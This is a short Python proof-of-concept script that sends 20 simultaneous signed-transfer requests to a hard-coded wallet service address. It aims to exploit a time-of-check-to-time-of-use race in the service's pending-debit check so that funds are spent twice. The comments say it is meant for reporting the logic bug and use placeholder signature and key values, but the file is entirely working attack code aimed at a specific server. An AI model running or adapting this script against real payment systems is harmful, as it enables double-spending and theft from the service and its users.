import asyncio
import aiohttp
import time
import hashlib

# Configuration
BASE_URL = "http://50.28.86.131:8099"
SENDER = "rtc_hackerwallet_50e14a122768e974"
RECIPIENT = "rtc_recipient_123456789"
AMOUNT = 100.0
# We need a valid-looking signature to pass the first check. 
# In a real attack, we'd use a real key. For PoC, we'll try to find a way to bypass or use a test key.
# Since we are reporting the logic bug, we will focus on the TOCTOU in pending_debits.
SIGNATURE = "a" * 128 
PUBKEY = "b" * 64

async def send_transfer(session, nonce):
    payload = {
        "from_address": SENDER,
        "to_address": RECIPIENT,
        "amount_rtc": AMOUNT,
        "nonce": nonce,
        "signature": SIGNATURE,
        "public_key": PUBKEY,
        "fee_rtc": 0
    }
    try:
        async with session.post(f"{BASE_URL}/wallet/transfer/signed", json=payload) as resp:
            return resp.status, await resp.text()
    except Exception as e:
        return 500, str(e)

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        print(f"Launching 20 parallel transfers for {SENDER}...")
        for i in range(1, 21):
            tasks.append(send_transfer(session, i))
        
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r[0] == 200]
        print(f"Results: {len(successes)} successful, {20 - len(successes)} failed.")
        for i, r in enumerate(results):
            print(f"Req {i+1}: Status {r[0]} - {r[1][:50]}...")

if __name__ == "__main__":
    asyncio.run(main())
